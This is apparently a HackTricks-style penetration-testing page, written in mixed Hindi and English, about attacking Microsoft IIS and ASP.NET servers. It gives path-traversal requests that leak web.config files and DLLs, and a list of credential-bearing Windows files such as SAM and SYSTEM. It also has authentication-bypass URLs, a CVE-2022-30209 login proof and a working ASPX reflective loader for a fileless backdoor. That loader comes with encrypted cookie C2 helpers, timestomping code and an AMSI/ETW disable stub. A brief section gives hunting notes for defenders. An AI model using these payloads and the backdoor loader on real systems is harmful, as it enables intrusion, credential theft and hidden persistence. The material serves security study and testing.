# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

टेस्ट executable फ़ाइल एक्सटेंशन्स:

- asp
- aspx
- config
- php

## आंतरिक IP पता प्रकटीकरण

किसी भी IIS सर्वर पर जहाँ आपको 302 मिलता है आप Host header को हटाकर और HTTP/1.0 का उपयोग करके कोशिश कर सकते हैं और response के अंदर Location header आपको आंतरिक IP पते की ओर इशारा कर सकता है:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
आंतरिक IP का खुलासा करने वाली प्रतिक्रिया:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config फ़ाइलें निष्पादित करें

आप .config फ़ाइलें अपलोड कर सकते हैं और उन्हें कोड निष्पादित करने के लिए उपयोग कर सकते हैं। एक तरीका है फाइल के अंत में एक HTML comment के अंदर कोड जोड़ देना: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

More information and techniques to exploit this vulnerability [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

Download the list that I have created:

{{#file}}
iisfinal.txt
{{#endfile}}

It was created merging the contents of the following lists:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

इसे किसी extension को जोड़कर उपयोग न करें; जिन फ़ाइलों को extension की ज़रूरत है वे पहले से ही वह extension रखती हैं।

## Path Traversal

### Leaking source code

Check the full writeup in: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> सारांश के रूप में, एप्लिकेशन के फ़ोल्डरों के अंदर कई web.config फ़ाइलें होती हैं जिनमें "**assemblyIdentity**" फ़ाइलों और "**namespaces**" के संदर्भ होते हैं। इस जानकारी से यह पता लगाया जा सकता है कि **executable कहाँ स्थित हैं** और उन्हें डाउनलोड किया जा सकता है।\
> डाउनलोड की गई **Dlls** से यह भी सम्भव है कि आप **नए namespaces** ढूंढ सकें जहाँ आप पहुँचने की कोशिश कर सकते हैं और web.config फ़ाइल प्राप्त कर सकते हैं ताकि नए namespaces और assemblyIdentity मिले।\
> इसके अलावा, फ़ाइलें **connectionstrings.config** और **global.asax** में भी रोचक जानकारी हो सकती है।

In **.Net MVC applications**, the **web.config** file plays a crucial role by specifying each binary file the application relies on through **"assemblyIdentity"** XML tags.

### **बाइनरी फ़ाइलों का अन्वेषण**

An example of accessing the **web.config** file is shown below:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
यह अनुरोध विभिन्न सेटिंग्स और निर्भरताएँ उजागर करता है, जैसे:

- **EntityFramework** संस्करण
- **AppSettings** वेबपेज, क्लाइंट सत्यापन, और JavaScript के लिए
- **System.web** प्रमाणीकरण और runtime के लिए विन्यास
- **System.webServer** मॉड्यूल सेटिंग्स
- **Runtime** असेंबली बाइंडिंग्स कई लाइब्रेरियों के लिए जैसे **Microsoft.Owin**, **Newtonsoft.Json**, और **System.Web.Mvc**

ये सेटिंग्स संकेत देती हैं कि कुछ फाइलें, जैसे **/bin/WebGrease.dll**, एप्लिकेशन के /bin फ़ोल्डर के भीतर स्थित हैं।

### **Root Directory Files**

रूट डायरेक्टरी में पाए जाने वाली फाइलें, जैसे **/global.asax** और **/connectionstrings.config** (जिसमें संवेदनशील पासवर्ड होते हैं), एप्लिकेशन की कॉन्फ़िगरेशन और संचालन के लिए आवश्यक हैं।

### **नामस्थान और Web.Config**

MVC अनुप्रयोग विशिष्ट नामस्थान के लिए अतिरिक्त **web.config** फ़ाइलें भी परिभाषित करते हैं ताकि हर फ़ाइल में पुनरावर्ती घोषणाओं से बचा जा सके, जैसा कि एक और **web.config** डाउनलोड करने के अनुरोध से दिखाया गया है:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLs डाउनलोड करना**

कस्टम namespace का उल्लेख इस बात का संकेत देता है कि /bin directory में **WebApplication1** नामक एक DLL मौजूद है। इसके बाद **WebApplication1.dll** डाउनलोड करने का अनुरोध दिखाया गया है:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
यह संकेत देता है कि /bin डायरेक्टरी में अन्य आवश्यक DLLs मौजूद हो सकते हैं, जैसे **System.Web.Mvc.dll** और **System.Web.Optimization.dll**।

यदि किसी परिदृश्य में कोई DLL **WebApplication1.Areas.Minded** नाम का namespace import करता है, तो एक attacker अनुमान लगा सकता है कि पूर्वानुमानित पाथ्स में अन्य web.config फाइलें मौजूद होंगी, जैसे **/area-name/Views/**, जिनमें विशिष्ट configurations और /bin फोल्डर में मौजूद अन्य DLLs के संदर्भ होते हैं। उदाहरण के लिए, **/Minded/Views/web.config** के लिए एक request उन configurations और namespaces का खुलासा कर सकती है जो दूसरे DLL, **WebApplication1.AdditionalFeatures.dll**, की उपस्थिति को दर्शाते हैं।

### Common files

From [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 त्रुटि

यदि आपको निम्नलिखित जैसी त्रुटि दिखे:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

इसका मतलब है कि सर्वर ने Host header के अंदर **सही domain name प्राप्त नहीं किया**.\  
वेब पेज तक पहुँचने के लिए आप सर्व किए गए **SSL Certificate** को देख सकते हैं और शायद वहाँ domain/subdomain नाम मिल जाए। अगर वह वहाँ नहीं है तो आपको सही one मिलने तक **brute force VHosts** करने की आवश्यकता हो सकती है।

## एन्क्रिप्टेड कॉन्फ़िगरेशन और ASP.NET Core Data Protection key rings को डिक्रिप्ट करें

IIS-hosted .NET apps पर secrets को सुरक्षित रखने के दो सामान्य पैटर्न हैं:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) — web.config के सेक्शन जैसे <connectionStrings> के लिए।
- ASP.NET Core Data Protection key ring (persisted locally) — application secrets और cookies को सुरक्षित करने के लिए इस्तेमाल होता है।

यदि आपके पास वेब सर्वर पर filesystem या interactive access है, तो साथ रखी गई keys अक्सर डिक्रिप्शन की अनुमति देती हैं।

- ASP.NET (Full Framework) – protected config सेक्शंस को aspnet_regiis से डिक्रिप्ट करें:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – स्थानीय रूप से संग्रहीत Data Protection key rings (XML/JSON files) के लिए निम्नलिखित स्थानों में देखें:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

Key ring उपलब्ध होने पर, ऐप की identity में चलने वाला एक operator उसी purposes के साथ एक IDataProtector instantiate कर सकता है और संग्रहीत secrets को unprotect कर सकता है। यदि key ring को app files के साथ संग्रहीत करने की misconfigurations हों तो host compromise होने पर offline decryption trivial हो जाता है।

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

Phantom Taurus/NET-STAR toolkit fileless IIS persistence और post‑exploitation के लिए एक परिपक्व पैटर्न दिखाता है, जो पूरी तरह से w3wp.exe के अंदर काम करता है। मूल विचार custom tradecraft और detection/hunting के लिए व्यापक रूप से reusable हैं।

Key building blocks
- ASPX bootstrapper hosting an embedded payload: एक single .aspx page (e.g., OutlookEN.aspx) एक Base64‑encoded, optionally Gzip‑compressed .NET DLL रखता है। ट्रिगर request पर यह decode, decompress और reflectively load करके current AppDomain में लोड करता है और main entry point (e.g., ServerRun.Run()) को invoke करता है।
- Cookie‑scoped, encrypted C2 with multi‑stage packing: tasks/results को Gzip → AES‑ECB/PKCS7 → Base64 के साथ पैक करके seemingly legitimate cookie‑heavy requests के माध्यम से भेजा जाता है; operators chunking के लिए stable delimiters (e.g., "STAR") का उपयोग करते थे।
- Reflective .NET execution: arbitrary managed assemblies को Base64 के रूप में स्वीकार करें, Assembly.Load(byte[]) के माध्यम से लोड करें और operator args पास करके disk को छुए बिना rapid module swaps करें।
- Operating in precompiled ASP.NET sites: साइट precompiled होने पर भी auxiliary shells/backdoors जोड़ें/मैनेज करें (e.g., dropper dynamic pages/handlers जोड़ता है या config handlers का उपयोग करता है) – ये bypassPrecompiledApp, addshell, listshell, removeshell जैसे commands द्वारा expose होते हैं।
- Timestomping/metadata forgery: एक changeLastModified action expose करें और deployment पर timestomp करें (future compilation timestamps सहित) ताकि DFIR को बाधित किया जा सके।
- Optional AMSI/ETW pre‑disable for loaders: second‑stage loader Assembly.Load कॉल करने से पहले AMSI और ETW को disable कर सकता है ताकि in‑memory payloads की inspection कम हो सके।

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
पैकिंग/crypto सहायक (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/session प्रवाह और कमांड सतह
- Session bootstrap और tasking cookies के माध्यम से ले जाया जाता है ताकि यह सामान्य web गतिविधि में घुल‑मिल जाए।
- वास्तविक मामलों में देखे गए कमांड्स में शामिल थे: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; and dynamic execution primitives code_self, code_pid, run_code for in‑memory .NET execution.

Timestomping utility
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Assembly.Load से पहले Inline AMSI/ETW disable (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
See AMSI/ETW bypass techniques in: windows-hardening/av-bypass.md

Hunting notes (defenders)
- एक अकेला, अजीब ASPX पेज बहुत लंबे Base64/Gzip ब्लॉब्स के साथ; cookie‑भारी पोस्ट।
- w3wp.exe के अंदर unbacked managed modules; strings जैसे Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run।
- ट्रैफ़िक में "STAR" जैसे बार-बार आने वाले delimiters; ASPX/assemblies पर mismatched या यहाँ तक कि future timestamps।

## पुरानी IIS कमजोरियाँ जिन्हें देखना चाहिए


### Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure

आप हर मिले हुए फ़ोल्डर के अंदर के **enumerate folders and files** आज़माने की कोशिश कर सकते हैं (यहां तक कि अगर यह Basic Authentication मांगता है) इस **technique** का उपयोग करके.\
यदि सर्वर vulnerable है तो इस technique की मुख्य सीमा यह है कि **यह प्रत्येक फ़ाइल/फ़ोल्डर के नाम के पहले 6 अक्षरों तक और फ़ाइल एक्सटेंशन के पहले 3 अक्षरों तक ही खोज सकता है**।

You can use [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) to test for this vulnerability:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

मूल रिसर्च: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

You can also use **metasploit**: `use scanner/http/iis_shortname_scanner`

खोजी गई फ़ाइलों का अंतिम नाम **find the final name** करने का एक अच्छा विचार है कि विकल्पों के लिए **ask LLMs** से पूछें, जैसा कि इस स्क्रिप्ट में किया गया है [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)

### Basic Authentication bypass

**Bypass** करने के लिए एक basic authentication (**IIS 7.5**) को आज़माएँ और इन URL को एक्सेस करने की कोशिश करें: `/admin:$i30:$INDEX_ALLOCATION/admin.php` या `/admin::$INDEX_ALLOCATION/admin.php`

आप इस **vulnerability** और पिछले एक को **mix** करने की कोशिश कर सकते हैं ताकि नए **folders** मिलें और authentication को **bypass** किया जा सके।

## ASP.NET Trace.AXD enabled debugging

ASP.NET में एक debugging mode शामिल है और उसकी फ़ाइल का नाम `trace.axd` है।

यह किसी एप्लीकेशन से किए गए सभी अनुरोधों का एक बहुत विस्तृत लॉग एक अवधि के दौरान रखता है।

इस जानकारी में remote client IPs, session IDs, सभी request और response cookies, physical paths, source code जानकारी, और संभावित रूप से usernames और passwords भी शामिल हो सकते हैं।

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH निम्नलिखित जानकारी का उपयोग करता है:

- **`validationKey`** (string): hex-encoded key जिसे signature validation के लिए उपयोग किया जाता है।
- **`decryptionMethod`** (string): (default “AES”).
- **`decryptionIV`** (string): hex-encoded initialization vector (defaults to a vector of zeros).
- **`decryptionKey`** (string): hex-encoded key जिसे decryption के लिए उपयोग किया जाता है।

हालाँकि, कुछ लोग इन पैरामीटरों के **default values** का उपयोग करते हैं और **cookie the email of the user** के रूप में सेट करते हैं। इसलिए, यदि आप उसी **same platform** का उपयोग करने वाली कोई वेब साइट ढूँढते हैं जो ASPXAUTH cookie का उपयोग कर रही है और आप हमले वाले सर्वर पर उस उपयोगकर्ता के ईमेल के साथ **create a user with the email of the user you want to impersonate** कर देते हैं, तो आप संभवतः दूसरे सर्वर के cookie को पहले सर्वर में us**e the cookie from the second server in the first one** कर के उस उपयोगकर्ता की impersonate कर सकेंगे। यह attack इस [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) में काम किया।

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): कोड में एक बग था जिसने **didn't properly check for the password given by the user**, इसलिए एक attacker जिसका **password hash hits a key** जो पहले से **cache** में है, वह उस user के रूप में login कर पाएगा।
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## संदर्भ

- [Unit 42 – Phantom Taurus: एक नया चीनी Nexus APT और NET-STAR Malware Suite की खोज](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass पृष्ठभूमि (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
